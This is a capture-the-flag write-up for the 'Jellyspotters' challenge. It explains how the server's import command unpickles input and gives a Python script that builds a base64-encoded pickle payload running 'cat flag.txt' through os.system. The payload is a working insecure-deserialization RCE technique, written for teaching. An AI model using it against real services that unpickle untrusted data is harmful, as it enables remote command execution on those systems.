## Jellyspotters

### Challenge Description  
The leader of the Jellyspotters has hired you to paint them a poster for their convention, using this painting program. Also, the flag is in `~/flag.txt`.  
`nc umbccd.io 4200`

### Writeup
We are given a server address. When you connect to this server, you see an interactive server that has some commands:  
![commands]()   
If we use `import` command with some random string, it reaches an error and this error is in python `pickle` library. This lib has RCE vulnerability and we can run our code in this server. We generated a script runnig `cat flag.txt`.   
```python
import pickle
import sys
import base64

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,("cat flag.txt",))

items = []
items.append(PickleRCE())
p = pickle.dumps(items)
print(base64.b64encode(p))
```
We gave the base64 dump of code bellow as input to `import` command and we got the flag.  
![import]()  